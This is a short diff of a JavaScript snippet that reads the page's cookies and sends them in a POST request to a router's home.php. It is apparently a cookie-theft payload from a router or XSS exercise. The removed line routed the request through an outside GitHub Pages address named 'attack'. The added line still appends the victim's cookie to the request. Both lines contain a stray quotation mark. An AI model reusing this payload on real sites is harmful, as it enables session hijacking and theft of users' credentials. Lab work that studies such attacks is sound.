@@ -3,7 +3,7 @@ const http = new XMLHttpRequest();
 //http://router.local/home.php?action=view&
 //http://router/local/view.php
 const cook = document.cookie;
-http.open('POST', 'http://router.local/home.php?action=http://nastassiagoodson.github.io/attack&'+cook', true);
+http.open('POST', 'http://router.local/home.php?action=view&'+cook', true);
 
 http.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
 
